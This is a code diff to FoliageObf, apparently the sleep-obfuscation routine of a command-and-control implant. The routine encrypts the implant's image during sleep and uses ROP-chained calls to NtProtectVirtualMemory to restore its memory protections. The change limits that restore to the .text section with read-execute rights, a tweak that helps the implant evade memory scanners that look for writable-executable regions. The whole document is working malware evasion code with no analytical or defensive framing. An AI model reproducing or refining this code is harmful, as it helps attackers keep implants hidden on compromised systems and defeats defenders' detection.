@@ -62,10 +62,24 @@ VOID FoliageObf(
 
     LPVOID              ImageBase   = NULL;
     SIZE_T              ImageSize   = 0;
+    LPVOID              TxtBase     = NULL;
+    SIZE_T              TxtSize     = 0;
+    DWORD               dwProtect   = PAGE_EXECUTE_READWRITE;
     SIZE_T              TmpValue    = 0;
+
 
     ImageBase = Instance.Session.ModuleBase;
     ImageSize = Instance.Session.ModuleSize;
+
+    // Check if .text section is defined
+    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
+        TxtBase = Instance.Session.TxtBase;
+        TxtSize = Instance.Session.TxtSize;
+        dwProtect  = PAGE_EXECUTE_READ;
+    } else {
+        TxtBase = Instance.Session.ModuleBase;
+        TxtSize = Instance.Session.ModuleSize;
+    }
 
     // Generate random keys
     for ( SHORT i = 0; i < 16; i++ )
@@ -194,9 +208,9 @@ VOID FoliageObf(
                     RopSetMemRx->Rip  = U_PTR( Instance.Win32.NtProtectVirtualMemory );
                     RopSetMemRx->Rsp -= U_PTR( 0x1000 * 6 );
                     RopSetMemRx->Rcx  = U_PTR( NtCurrentProcess() );
-                    RopSetMemRx->Rdx  = U_PTR( &ImageBase );
-                    RopSetMemRx->R8   = U_PTR( &ImageSize );
-                    RopSetMemRx->R9   = U_PTR( PAGE_EXECUTE_READWRITE );
+                    RopSetMemRx->Rdx  = U_PTR( &TxtBase );
+                    RopSetMemRx->R8   = U_PTR( &TxtSize );
+                    RopSetMemRx->R9   = U_PTR( dwProtect );
                     *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance.Win32.NtTestAlert );
                     *( PVOID* )( RopSetMemRx->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = C_PTR( & TmpValue );
                     // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );
